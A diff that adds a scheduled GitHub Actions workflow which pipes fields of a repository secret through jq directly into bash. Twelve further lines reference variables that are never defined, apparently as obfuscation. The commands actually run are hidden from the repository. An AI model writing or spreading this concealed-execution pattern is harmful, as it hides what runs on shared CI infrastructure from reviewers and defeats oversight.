@@ -1,0 +1,30 @@
+name: shishangrenmei
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '7 5/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: shishangrenmei
+        env:
+          fxmm34364: ${{ secrets.fxmm34364 }}
+        run: |
+          echo $fxmm34364 | jq -r .cq282 | /bin/bash
+          echo $stejf97 | jq -r .amdpn2326 | /bin/bash
+          echo $ffvm013 | jq -r .nv1 | /bin/bash
+          echo $kkt2215 | jq -r .oh32656 | /bin/bash
+          echo $dchn809 | jq -r .ajd9480 | /bin/bash
+          echo $jypvd6380 | jq -r .kusle78029 | /bin/bash
+          echo $y3050 | jq -r .kasq72300 | /bin/bash
+          echo $oos79 | jq -r .y89763 | /bin/bash
+          echo $w9 | jq -r .r435 | /bin/bash
+          echo $qp2 | jq -r .ufput49 | /bin/bash
+          echo $nizc847 | jq -r .hjd5 | /bin/bash
+          echo $b3272 | jq -r .xtt82232 | /bin/bash
+          echo $ochmm42 | jq -r .zalm6572 | /bin/bash
+
